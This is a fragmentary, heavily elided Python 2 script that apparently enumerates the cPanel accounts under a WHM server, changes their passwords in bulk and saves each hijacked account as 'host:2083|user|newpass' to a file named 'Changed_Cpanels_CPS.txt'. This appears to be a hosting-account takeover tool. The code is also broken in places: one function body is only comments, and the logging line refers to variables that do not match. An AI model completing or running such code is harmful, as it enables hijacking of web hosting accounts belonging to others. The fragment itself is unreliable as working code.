    ...
    if STATUS == 'good':
        ...
        try:
            ...
            for i in xrange(CPs_Count):
                ...
                #print(CP_USER)
                #CP_DOMAIN = TEXT.split('domain="')[1:0]
                CP_DOMAIN = src.split('domain="')[GG].split('" suspended="')[0]
...
def Change_Pass(PASS):
    if STATUS == 'good':
        for DATA in WHM_Domains:
            ...
            #MainDOM = DATA.split('domain="')[1].split('" suspended="')[0]
            #CP_DOM1 = DATA.replace(CP_US+':','')
            #print(DATA)
            # // print r.content
            print '\n'
...
def Change_CP_Pass(Host, OLD_PASS, NEW_PASS):
    if STATUS == 'good':
        ...
        if 'Success! The browser is now redirecting' in r.content:
            print '\n\t{} -| {}Password For {}{} {}Has Been Changed To : {}{}'.format(RED, WHITE, RED, Host, WHITE, RED, PASS)
            file = open('Changed_Cpanels_CPS.txt', 'a+')
            file.write('https://{}:2083|{}|{}\n'.format(Host, User, NEW_PASS))
            file.close()
        else:
            print '\n\t{} -| {}Failed Changing Password For {}{}'.format(WHITE, RED, WHITE, Host)
    else:
        # // print '\n\t{} -| {}Failure Status Found, Please Review Your Login Data.'.format(WHITE, RED)
        pass
